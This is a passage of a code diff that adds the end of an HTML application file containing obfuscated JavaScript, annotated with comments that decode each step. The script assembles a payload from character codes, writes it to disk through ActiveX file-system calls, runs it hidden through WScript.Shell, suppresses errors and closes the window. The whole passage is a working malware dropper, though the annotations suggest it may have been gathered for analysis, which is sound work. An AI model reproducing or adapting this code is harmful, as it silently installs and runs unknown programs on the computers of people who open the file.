@@ -1,0 +1,19 @@
+      , i, len;
+  len = data['length'];
+  var content = '';
+  for (i = 0x0; i < len; i++) {
+    content += String[_0x556975(0x1dc)](data[i]); // content += String.fromCharCode(data[i])
+  }
+  e = b[_0x556975(0x1e3)](d, 0x8, ![], -0x1), // call Scripting.FileSystemObject.OpenTextFile(path, 8, false, -1)
+    e[_0x556975(0x1ec)](content), // call Write(content) on the opened file
+    e[_0x556975(0x1eb)](); // close the file
+  var c = new ActiveXObject('WScript.Shell');
+  c['Run'](d, 0x0); // run the payload
+  
+} catch (_0x1f5265) {}
+window[_0x556975(0x1e7)](); // window.close()
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
